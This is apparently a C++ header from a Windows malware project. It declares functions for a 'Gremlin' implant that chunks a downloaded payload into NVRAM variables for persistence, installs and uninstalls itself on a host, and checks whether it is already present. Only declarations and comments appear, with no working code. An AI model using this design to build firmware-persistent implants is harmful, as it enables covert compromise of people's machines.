#pragma once

#include <Windows.h>
#include <string>

// Chunk the downloaded payload and write the chunks into NVRAM variables
// ------------------------------------------------------------------------

BOOL write_payload(std::string payload);

// Delete all NVRAM vars containing payload
// ------------------------------------------------------------------------

BOOL delete_payload();

// To install Gremlin implant on host
// ------------------------------------------------------------------------

BOOL install(HMODULE hMod);

// To uninstall Gremlin implant from host
// ------------------------------------------------------------------------

BOOL uninstall();

// Check whether host already contains Gremlin implant
// ------------------------------------------------------------------------

BOOL exists();

// Our pseudo entry-point
// ------------------------------------------------------------------------

void go(HMODULE hMod);